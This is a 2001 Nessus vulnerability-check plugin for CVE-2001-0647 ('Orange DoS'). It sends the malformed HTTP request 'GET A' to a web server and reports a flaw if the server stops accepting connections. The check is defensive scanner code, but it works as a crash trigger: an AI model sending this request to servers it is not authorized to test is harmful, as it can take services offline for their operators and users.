
#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10636);
 script_bugtraq_id(20010227, 2432);
 script_version ("$Revision: 1.14 $");
 script_cve_id("CVE-2001-0647");
 
 name["english"] = "Orange DoS";
 name["francais"] = "Orange DoS";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible
to make the remote web server crash
by sending it an invalid HTTP request (GET A)

An attacker may use this flaw to
prevent this host from fulfilling
its role

Solution : contact your vendor for a patch
Risk factor : High";


 desc["francais"] = "Il s'est av�r�
possible de faire planter le
serveur web distant en envoyant une 
requ�te HTTP erron�e (GET A)

Un pirate peut utiliser cette
attaque pour empecher cette machine
de remplir son role de serveur web.

Solution : contactez le vendeur pour un patch.
Facteur de risque : S�rieux";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote web server";
 summary["francais"] = "Plante le serveur web distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "D�ni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");


port = get_http_port(default:80);

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 { 
  req = string("GET A\r\n");
  send(socket:soc, data:req);
  close(soc);
  sleep(2);

  soc2 = open_sock_tcp(port);
  if(!soc2)security_hole(port);
 }
}
